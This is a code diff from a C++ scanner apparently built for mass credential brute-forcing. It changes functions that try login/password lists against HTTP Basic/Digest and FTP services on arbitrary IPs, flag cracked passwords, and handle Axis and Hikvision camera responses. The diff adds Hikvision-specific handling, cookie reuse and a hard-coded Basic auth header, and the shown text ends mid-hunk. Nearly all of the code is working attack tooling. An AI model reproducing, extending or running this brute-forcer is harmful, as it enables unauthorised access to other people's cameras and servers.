@@ -50,7 +50,7 @@ void SSHConInc()
 };
 void SSHConDec()
 {
-	while(SSHConnLocked == true) Sleep(8);
+	while(SSHConnLocked == true) Sleep(6);
 
 	SSHConnLocked = true;
 	if(BrutingThrds > 0) --BrutingThrds;
@@ -143,21 +143,6 @@ string toLowerStr(const char *str)
 	};
 	return "";
 };
-SSL_CTX* InitCTX(void)
-{   
-	const SSL_METHOD *method;
-	SSL_CTX *ctx;
-
-	method = SSLv3_client_method();  /* Create new client-method instance */
-	ctx = SSL_CTX_new(method);   /* Create new context */
-	SSL_CTX_set_timeout(ctx, gTimeOut);
-	if ( ctx == NULL )
-	{
-		stt->doEmitionRedFoundData("SSL(InitCTX).");
-		return NULL;
-	}
-	return ctx;
-}
 int OpenConnection(SOCKET *sock, const char *hostname, int port)
 {   
 	struct hostent *host;
@@ -176,23 +161,6 @@ int OpenConnection(SOCKET *sock, const char *hostname, int port)
 	if ( (host = gethostbyname(hostname)) == NULL )
 	{
 		++offlines;
-		if(mode != 1) 
-		{
-			char temp[256] = {0};
-			strcpy(temp, "[Bad address (");
-
-			strcat(temp, hostname);
-			strcat(temp, ":");
-			strcat(temp, std::to_string((long double)port).c_str());
-			strcat(temp, "):");
-			strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
-			strcat(temp, "]");
-
-#pragma region QTGUI_Area
-			stt->doEmitionRedFoundData("[SSL]: " + QString(temp));
-#pragma endregion
-
-		};
 		if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(hostname) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(hostname) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad IP.");
 		return -1;
 	};
@@ -213,7 +181,9 @@ int OpenConnection(SOCKET *sock, const char *hostname, int port)
 void _baSSLWorker(char *ip, char *request, char *rvBuff)
 {
 	SSL_CTX *ctx = NULL;
-	ctx = InitCTX();
+	const SSL_METHOD *method = SSLv3_client_method();  /* Create new client-method instance */
+	ctx = SSL_CTX_new(method);   /* Create new context */
+	SSL_CTX_set_timeout(ctx, gTimeOut);
 	SOCKET sock;
 	if(ctx != NULL)
 	{
@@ -225,7 +195,6 @@ void _baSSLWorker(char *ip, char *request, char *rvBuff)
 			if(ssl != NULL)
 			{
 				SSL_set_fd(ssl, sock);    /* attach the socket descriptor */
-
 				if(SSL_connect(ssl))
 				{
 					SSL_write(ssl, request, strlen(request));
@@ -258,6 +227,10 @@ void _baSSLWorker(char *ip, char *request, char *rvBuff)
 		};
 		closesocket(sock);         /* close socket */
 		SSL_CTX_free(ctx);        /* release context */
+	}
+	else
+	{
+		stt->doEmitionRedFoundData("SSL(InitCTX).");
 	};
 };
 char *_getAttributeValue(char *str, char *val, char *ip, int port)
@@ -270,6 +243,7 @@ char *_getAttributeValue(char *str, char *val, char *ip, int port)
 	ptrStart = strstri(str, val);
 	if(ptrStart != NULL)
 	{
+		if(strstri(ptrStart, "qop=auth") != NULL) return "auth";
 		ptrS1End = _findFirstOcc(ptrStart, "\"");
 		if(ptrS1End != NULL)
 		{
@@ -285,19 +259,19 @@ char *_getAttributeValue(char *str, char *val, char *ip, int port)
 			}
 			else
 			{
-				stt->doEmitionRedFoundData("[_getAttributeValue] Error while retrieving value: \"" + QString(val) + "\" IP:<a style=\"color:#819121;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\">" + QString(ip) + ":" + QString::number(port) + "</a>");
+				stt->doEmitionRedFoundData("[_getAttributeValue] Error retrieving value: \"" + QString(val) + "\" IP:<a style=\"color:#819121;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\">" + QString(ip) + ":" + QString::number(port) + "</a>");
 				return "";				
 			};
 		}
 		else
 		{
-			stt->doEmitionRedFoundData("[_getAttributeValue] Error while retrieving value: \"" + QString(val) + "\" IP:<a style=\"color:#919121;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\">" + QString(ip) + ":" + QString::number(port) + "</a>");
+			stt->doEmitionRedFoundData("[_getAttributeValue] Error retrieving value: \"" + QString(val) + "\" IP:<a style=\"color:#919121;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\">" + QString(ip) + ":" + QString::number(port) + "</a>");
 			return "";				
 		};
 	}
 	else
 	{
-		stt->doEmitionRedFoundData("[_getAttributeValue] Error while retrieving value: \"" + QString(val) + "\" IP:<a style=\"color:#819121;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\">" + QString(ip) + ":" + QString::number(port) + "</a>");
+		stt->doEmitionRedFoundData("[_getAttributeValue] Error retrieving value: \"" + QString(val) + "\" IP:<a style=\"color:#819121;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\">" + QString(ip) + ":" + QString::number(port) + "</a>");
 		return "";
 	};
 };
@@ -388,7 +362,6 @@ char *_makeDigestResponse(
 	CvtHex(response, responseMD5);
 	return (char*)responseMD5;
 };
-volatile bool baSSLLocked = false;
 lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 {
 	if(strcmp(method, "[DIGEST]") != 0 && strcmp(method, "[NORMAL]") != 0) stt->doEmitionRedFoundData("[-] Unknown method IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + + "</a>"); 
@@ -403,8 +376,8 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 
 	int bTO;
 	bool goon = false;
-	char hRqst[1024] = {0};
-	char headerMsg[1024] = {0};
+	char hRqst[REQUEST_MAX_SIZE] = {0};
+	char headerMsg[REQUEST_MAX_SIZE] = {0};
 	char hMsgR[512] = {0};
 
 	strcpy(hRqst, "GET ");
@@ -416,18 +389,18 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 		strcat(hRqst, "\r\nCookie: ");
 		strcat(hRqst, cookie);
 	};
-	strcat(hRqst, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\n\r\n");
+	strcat(hRqst, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nAuthorization: Basic bG9sa2E6bG9sa2F=\r\n\r\n");
 	
 	sockaddr_in sockAddr;
 	SOCKET sock;
 #pragma region VerifyBASSL
 	if(port == 443)
 	{
-		ZeroMemory(headerMsg, sizeof(headerMsg));
-		while(baSSLLocked) Sleep(200);
-		baSSLLocked = true;
+		ZeroMemory(headerMsg, REQUEST_MAX_SIZE);
+//		while(baSSLLocked) Sleep(200);
+//		baSSLLocked = true;
 		_baSSLWorker(ip, hRqst, headerMsg);
-		baSSLLocked = false;
+//		baSSLLocked = false;
 	}
 #pragma endregion
 	else
@@ -441,18 +414,18 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 		else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
 		else
 		{
-#pragma region QTGUI_Area
-			stt->doEmitionRedFoundData("[BA] Bad address! [" + QString(ip) + "]");
-#pragma endregion
+			OnLiner = 0;
+			strcpy(lps.login, "UNKNOWN");
+			return lps;
 		};
 #else
 		if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
 		else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
 		else
 		{
-#pragma region QTGUI_Area
-			stt->doEmitionRedFoundData("[BA] Bad address! [" + QString(ip) + "]");
-#pragma endregion
+			OnLiner = 0;
+			strcpy(lps.login, "UNKNOWN");
+			return lps;
 		};
 #endif
 		SOCKET sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
@@ -460,7 +433,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 
 		send(sock, hRqst, strlen(hRqst), 0);
 		if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(hRqst));
-		ZeroMemory(headerMsg, sizeof(headerMsg));
+		ZeroMemory(headerMsg, REQUEST_MAX_SIZE);
 		int x = 1;
 		int xx = 0;
 		while(xx < 512)
@@ -481,7 +454,12 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 		strcpy(lps.login, "UNKNOWN");
 		return lps;
 	};
-	if(strstr(headerMsg, "401 ") == NULL && strstr(headerMsg, ".1 401") == NULL && strstr(headerMsg, ".0 401") == NULL)
+	if(strstr(headerMsg, "401 ") == NULL 
+		&& strstr(headerMsg, ".1 401") == NULL 
+		&& strstr(headerMsg, ".0 401") == NULL
+		&& strstr(headerMsg, "<statusValue>401</statusValue>") == NULL
+		&& strstr(headerMsg, "<statusString>Unauthorized</statusString>") == NULL
+		)
 	{
 		if(strstri(headerMsg, "400 Bad") != NULL)
 		{
@@ -492,7 +470,11 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 			OnLiner = 0;
 			return lps;
 		}
-		else if(strstri(headerMsg, "404 Not") != NULL || strstr(headerMsg, "404 ") != NULL || strstr(headerMsg, ".1 404") != NULL || strstr(headerMsg, ".0 404") != NULL)
+		else if(strstri(headerMsg, "404 Not") != NULL 
+			|| strstr(headerMsg, "404 ") != NULL 
+			|| strstr(headerMsg, ".1 404") != NULL 
+			|| strstr(headerMsg, ".0 404") != NULL
+			)
 		{
 			if(strstr(path, "/axis-cgi/com/ptz.cgi?") != NULL)
 			{
@@ -510,6 +492,15 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				OnLiner = 0;
 				return lps;
 			};
+		}
+		else if(															//
+			(strstr(headerMsg, ".1 403") != NULL							//
+			|| strstr(headerMsg, ".0 403") != NULL							//Hikkvision2
+			)																//
+			&& strstr(headerMsg, "badAuthorization") != NULL				//
+			)
+		{
+			goon = true;
 		}
 		else if(strlen(headerMsg) < 16)
 		{
@@ -541,8 +532,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 	int cErrCode;
 	int x = 1;
 	int dataSz = 0;
-	int maxSize = 1024;
-	char request[4096] = {0};
+	char request[REQUEST_MAX_SIZE] = {0};
 	char recvBuff[4096] = {0};
 	char recvBuff2[512] = {0};
 	char pass[256] = {0};
@@ -565,21 +555,21 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 			Sleep(80);
 			if(globalScanFlag == false) break;
 
-			ZeroMemory(request, 4096);
-			ZeroMemory(curLogin, 256);
-			ZeroMemory(curPass, 256);
+			ZeroMemory(request, REQUEST_MAX_SIZE);
+			ZeroMemory(curLogin, sizeof(curLogin));
+			ZeroMemory(curPass, sizeof(curPass));
 			strcpy(curLogin, loginLst[i]);
 			strcpy(curPass, passLst[j]);
 
 			if(strcmp(method, "[DIGEST]") == 0 && strstr(localBuff, "nonce=") != NULL)
 			{
-				ZeroMemory(attribute, 2048);
+				ZeroMemory(attribute, sizeof(attribute));
 				strcpy(attribute, _getAttribute(localBuff, "WWW-Authenticate:"));
-				ZeroMemory(nonce, 512);
+				ZeroMemory(nonce, sizeof(nonce));
 				strcpy(nonce, _getAttributeValue(attribute, "nonce=", ip, port));
-				ZeroMemory(realm, 512);
+				ZeroMemory(realm, sizeof(realm));
 				strcpy(realm, _getAttributeValue(attribute, "realm=", ip, port));
-				ZeroMemory(qop, 64);
+				ZeroMemory(qop, sizeof(qop));
 				if(strstri(attribute, "qop") != NULL)
 				{
 					strcpy(qop, _getAttributeValue(attribute, "qop=", ip, port));
@@ -594,6 +584,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 					strcat(request, "\r\nCookie: ");
 					strcat(request, cookie);
 				};
+				
 				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nAuthorization: Digest username=\"");					
 				strcat(request, curLogin);
 				strcat(request, "\", realm=\"");
@@ -606,23 +597,21 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				strcat(request, _makeDigestResponse(curLogin, realm, curPass, path, nonce, "10000001", "9d531d56796e0dc9", qop));
 				if(strstri(attribute, "opaque") != NULL)
 				{
-					ZeroMemory(opaque, 512);
+					ZeroMemory(opaque, sizeof(opaque));
 					strcpy(opaque, _getAttributeValue(attribute, "opaque=", ip, port));
 					strcat(request, "\", opaque=\"");
 					strcat(request, opaque);
 				};
-				//strcat(request, "\"");
 				strcat(request, "\", nc=10000001, cnonce=\"9d531d56796e0dc9\"");
 				strcat(request, "\r\nConnection: close\r\n\r\n");
 			}
 			else
 			{
-				ZeroMemory(tPass, 256);
+				ZeroMemory(tPass, sizeof(tPass));
 				strncpy(tPass, curLogin, strlen(curLogin));
 				strcat(tPass, ":");
 				strncat(tPass, curPass, strlen(curPass));
 				encoded = base64_encode((const unsigned char *)tPass, strlen(tPass));
-				strcpy(tPass, base64_decode(encoded).c_str());
 				strcpy(request, "GET ");
 				strcat(request, path);
 				strcat(request, " HTTP/1.1\r\nHost: ");
@@ -632,6 +621,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 					strcat(request, "\r\nCookie: ");
 					strcat(request, cookie);
 				};
+				
 				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nAuthorization: Basic ");					
 				strcat(request, encoded.c_str());
 				strcat(request, "\r\nConnection: close\r\n\r\n");
@@ -640,12 +630,13 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 #pragma region BABSEQ-HTTPS
 			if(port == 443)
 			{
-				ZeroMemory(recvBuff, 4096);
-				while(baSSLLocked) Sleep(100);
-				baSSLLocked = true;
+				ZeroMemory(recvBuff, sizeof(recvBuff));
+//				while(baSSLLocked) Sleep(100);
+//				baSSLLocked = true;
 				if(BALogSwitched) stt->doEmitionBAData("Probing SSL:BA " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(tPass) + ";");
 				_baSSLWorker(ip, request, recvBuff);
-				baSSLLocked = false;
+				dataSz = strlen(recvBuff);
+//				baSSLLocked = false;
 			}
 #pragma endregion
 			else
@@ -673,17 +664,15 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 					{
 						if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
 						dataSz = 0;
-						maxSize = 1024;
-						ZeroMemory(recvBuff2, 512);
-						ZeroMemory(recvBuff, 4096);
+						ZeroMemory(recvBuff2, sizeof(recvBuff2));
+						ZeroMemory(recvBuff, sizeof(recvBuff));
 						while (x > 0 && dataSz < 3384)				
 						{
-							ZeroMemory(recvBuff2, 512);
-							x = recvWT(sock, recvBuff2, 512, gTimeOut + 5, &bTO);
+							ZeroMemory(recvBuff2, sizeof(recvBuff2));
+							x = recvWT(sock, recvBuff2, sizeof(recvBuff2), gTimeOut + 5, &bTO);
 
 							dataSz += x;
 							Activity += x;
-
 							strncat(recvBuff, recvBuff2, x);
 						};
 						if(BALogSwitched) stt->doEmitionBAData("Checked BA: " + QString(ip) + ":" + QString::number(port) + "; login/pass: " + QString(curLogin) + ":" + QString(curPass) + ";	- Progress: (" + QString::number((passCounter++/(double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");
@@ -721,7 +710,6 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 			};
 #pragma endregion
 			
-			if(globalScanFlag == false) break;
 			if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff));
 
 			if(dataSz == 0)
@@ -730,16 +718,14 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				--j;
 				continue;
 			};
-
 			if(strcmp(method, "[DIGEST]") == 0)
 			{
-				ZeroMemory(localBuff, 4096);
+				ZeroMemory(localBuff, sizeof(localBuff));
 				strcpy(localBuff, recvBuff);
 			};
 			
 			if(strstri(recvBuff, "http/1.1 401") == NULL
 				|| strstri(recvBuff, "http/1.0 401") == NULL
-				//|| (strstri(recvBuff, "401") != NULL && strstri(recvBuff, "unauthorized") != NULL)
 				)
 			{
 				///dummy///
@@ -776,14 +762,11 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 			}
 			else if( (strstri(recvBuff, "200 ok") != NULL 
 				|| strstri(recvBuff, "http/1.0 200") != NULL
-				) 
-				//&& strstri(recvBuff, "access forbidden") == NULL 
-				//&& strstri(recvBuff, "authentication required") == NULL
-				//&& strstri(recvBuff, "authentication failed") == NULL
+				)
 				&& strstri(recvBuff, "http/1.1 401 ") == NULL
 				&& strstri(recvBuff, "http/1.0 401 ") == NULL
-				//&& strstri(recvBuff, "401 unauthorized") == NULL
-				//&& strstri(recvBuff, "401 authorization") == NULL
+				&& strstr(headerMsg, "<statusValue>401</statusValue>") == NULL
+				&& strstr(headerMsg, "<statusString>Unauthorized</statusString>") == NULL
 				&& dataSz > 13
 				) 
 			{
@@ -793,7 +776,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 					&& strstri(recvBuff, "access forbidden") == NULL
 					)
 				{
-					ZeroMemory(pass, 256);
+					ZeroMemory(pass, sizeof(pass));
 					strcpy(pass, ip);
 					strcat(pass, " - Password found: ");
 					strcat(pass, tPass);
@@ -801,13 +784,12 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 					stt->doEmition_BAGreenData("[+] " + QString(pass));
 					strcpy(lps.login, curLogin);
 					strcpy(lps.pass, curPass);
-
 					return lps;
 				};
 			}
 			else
 			{
-				ZeroMemory(pass, 256);
+				ZeroMemory(pass, sizeof(pass));
 				strcpy(pass, ip);
 				strcat(pass, " - Password found: ");
 				strcat(pass, tPass);
@@ -825,26 +807,19 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 						if(strcmp(tempHeaderCode, "302") == 0 && strcmp(tempHeaderCode, "200") == 0) stt->doEmitionYellowFoundData("[+] No/unexpected HTTP header detected (" + QString(tempHeaderCode) + ") IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + "</a>");
 						strcpy(lps.login, curLogin);
 						strcpy(lps.pass, curPass);
-
-						return lps;
-					}
-					else
-					{
-						stt->doEmitionYellowFoundData("[+] No/unexpected HTTP header detected (?) IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + "</a>");						
-						strcpy(lps.login, curLogin);
-						strcpy(lps.pass, curPass);
-
 						return lps;
 					};
-				}
-				else
-				{
-					stt->doEmitionYellowFoundData("[+] No/unexpected HTTP header detected (?) IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + "</a>");						
-					strcpy(lps.login, curLogin);
-					strcpy(lps.pass, curPass);
-
-					return lps;
 				};
+				stt->doEmitionYellowFoundData("[+] No/unexpected HTTP header detected (?) IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + "</a>");						
+				strcpy(lps.login, curLogin);
+				strcpy(lps.pass, curPass);
+				return lps;
+			};
+			if(strstr(recvBuff, "Set-Cookie:") != NULL)
+			{
+				ZeroMemory(cookie, COOKIE_MAX_SIZE);
+				strncpy(cookie, _getAttribute(recvBuff, "Set-Cookie:"), COOKIE_MAX_SIZE);
+				cookieLen = strlen(cookie);
 			};
 		};
 	};
@@ -883,19 +858,17 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
 	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
 	else 
-	{	
-#pragma region QTGUI_Area
-		stt->doEmitionRedFoundData(QString("Bad address! (") + QString(ip) + ")");
-#pragma endregion
+	{
+		strcpy(lps.login, "UNKNOWN");
+		return lps;
 	};
 #else
 	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
 	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
 	else 
 	{
-#pragma region QTGUI_Area
-		stt->doEmitionRedFoundData("Bad address! [" + QString(ip) + "]");
-#pragma endregion
+		strcpy(lps.login, "UNKNOWN");
+		return lps;
 	};
 #endif
 
@@ -940,7 +913,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 				{
 					Sleep(100);
 					if(globalScanFlag == false) break;
-					ZeroMemory(recvBuff, 1024);
+					ZeroMemory(recvBuff, sizeof(recvBuff));
 					x = recvWT(sockFTP, recvBuff, 1024, gTimeOut + 5, &bTO);
 					if(x <= 0) break;
 					if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff));
@@ -1009,7 +982,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 						shutdown(sockFTP, SD_BOTH);
 						closesocket(sockFTP);
 						closedSocket = 1;
-						ZeroMemory(recvBuff, 1024);
+						ZeroMemory(recvBuff, sizeof(recvBuff));
 						break;
 					};
 
@@ -1018,7 +991,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 						shutdown(sockFTP, SD_BOTH);
 						closesocket(sockFTP);
 						closedSocket = 1;
-						ZeroMemory(recvBuff, 1024);
+						ZeroMemory(recvBuff, sizeof(recvBuff));
 						break;
 					};
 
@@ -1028,7 +1001,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 						shutdown(sockFTP, SD_BOTH);
 						closesocket(sockFTP);
 						closedSocket = 1;
-						ZeroMemory(recvBuff, 1024);
+						ZeroMemory(recvBuff, sizeof(recvBuff));
 						break;
 					};
 
@@ -1046,7 +1019,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 						closesocket(sockFTP);
 						closedSocket = 1;
 						if(j > 0) --j;
-						ZeroMemory(recvBuff, 1024);
+						ZeroMemory(recvBuff, sizeof(recvBuff));
 						Sleep(30000);
 						break;
 					}
@@ -1057,7 +1030,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 						else 
 						{
 							loginFailedFlag = 1;
-							ZeroMemory(recvBuff, 1024);
+							ZeroMemory(recvBuff, sizeof(recvBuff));
 							break;
 						};
 						strcat(request, "\r\n");
@@ -1066,7 +1039,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 							if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
 							Activity += strlen(request);
 
-							ZeroMemory(request, 64);
+							ZeroMemory(request, sizeof(request));
 						}
 						else
 						{
@@ -1079,7 +1052,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 						) 
 					{	
 						loginFailedFlag = 1;
-						ZeroMemory(recvBuff, 1024);
+						ZeroMemory(recvBuff, sizeof(recvBuff));
 						break;
 					}
 					else if(strstr(recvBuff, "331") != NULL)
@@ -1104,7 +1077,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 							else 
 							{
 								loginFailedFlag = 1;
-								ZeroMemory(recvBuff, 1024);
+								ZeroMemory(recvBuff, sizeof(recvBuff));
 								break;
 							};
 							strcat(request, "\r\n");
@@ -1113,7 +1086,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 								if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
 
 								Activity += strlen(request);
-								ZeroMemory(request, 64);
+								ZeroMemory(request, sizeof(request));
 
 								if(BALogSwitched) stt->doEmitionBAData("Probing FTP: " + QString(ip) + ":" + QString::number(port) + "; login/pass: " + QString(loginLst[i]) + ":" + QString(passLst[j]) + ";	- Progress: (" + QString::number((passCounter++/(double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");
 							}
@@ -1145,8 +1118,8 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 							int x = 1, xx = 0;
 							while(x != 0)
 							{
-								ZeroMemory(recvBuff, 1024);
-								x = recvWT(sockFTP, recvBuff, 512, gTimeOut + 5, &bTO);
+								ZeroMemory(recvBuff, sizeof(recvBuff));
+								x = recvWT(sockFTP, recvBuff, sizeof(recvBuff), gTimeOut + 5, &bTO);
 								xx += x;
 								if(xx < 1536) strncat(recvBuff2, recvBuff, x);
 								else break;
@@ -1270,7 +1243,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 				shutdown(sockFTP, SD_BOTH);
 				closesocket(sockFTP);
 				closedSocket = 1;
-				ZeroMemory(recvBuff, 1024);
+				ZeroMemory(recvBuff, sizeof(recvBuff));
 			}
 			else
 			{
@@ -1337,7 +1310,10 @@ int _sslConnectTo(char *iph, int porth, char *requesth, conSTR *CSTR)
 	int resCode = 0;
 	SOCKET sock;
 
-	SSL_CTX *ctx = InitCTX();
+	SSL_CTX *ctx = NULL;
+	const SSL_METHOD *method = SSLv3_client_method();  /* Create new client-method instance */
+	ctx = SSL_CTX_new(method);   /* Create new context */
+	SSL_CTX_set_timeout(ctx, gTimeOut);
 	if(ctx != NULL)
 	{
 		resCode = OpenConnection(&sock, iph, porth);
@@ -1353,8 +1329,8 @@ int _sslConnectTo(char *iph, int porth, char *requesth, conSTR *CSTR)
 
 				int x = 256;
 				char recvBuff[8192] = {0};
-				recvBuff2 = new char[RECV_MAX_LENGTH];
-				ZeroMemory(recvBuff2, RECV_MAX_LENGTH);
+				recvBuff2 = new char[RECV_MAX_SIZE];
+				ZeroMemory(recvBuff2, RECV_MAX_SIZE);
 
 				while (x > 0)		
 				{
@@ -1365,7 +1341,7 @@ int _sslConnectTo(char *iph, int porth, char *requesth, conSTR *CSTR)
 					bytes += x;
 					Activity += x;
 
-					if( bytes > RECV_MAX_LENGTH ) 
+					if( bytes > RECV_MAX_SIZE ) 
 					{
 						if(strstri(recvBuff2, "http/1.") == NULL)
 						{
@@ -1459,6 +1435,7 @@ int _sslConnectTo(char *iph, int porth, char *requesth, conSTR *CSTR)
 			};
 		};
 	};
+	stt->doEmitionRedFoundData("SSL(InitCTX).");
 	return -1;
 };
 int Connector::_EstablishSSLConnection(char *iph, int porth, char *requesth, conSTR *CSTR)
@@ -1479,12 +1456,12 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 	CSTR->lowerBuff = NULL;
 	if(strlen(ip) == 0) 
 	{	
-		if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad IP.");
+		stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad IP.");
 		return -1;
 	};
 	if(port < 0 || port > 65535) 
 	{
-		if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad port.");
+		stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad port.");
 		return -1;
 	};
 
@@ -1503,55 +1480,15 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 	else 
 	{
 		++offlines;
-		if(mode != 1) 
-		{
-			char temp[256] = {0};
-			strcpy(temp, "[Bad address (");
-
-			strcat(temp, ip);
-			strcat(temp, ":");
-			strcat(temp, std::to_string((long double)port).c_str());
-			strcat(temp, "):");
-			strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
-			strcat(temp, "]");
-
-#pragma region QTGUI_Area
-			stt->doEmitionRedFoundData(QString(temp));
-#pragma endregion
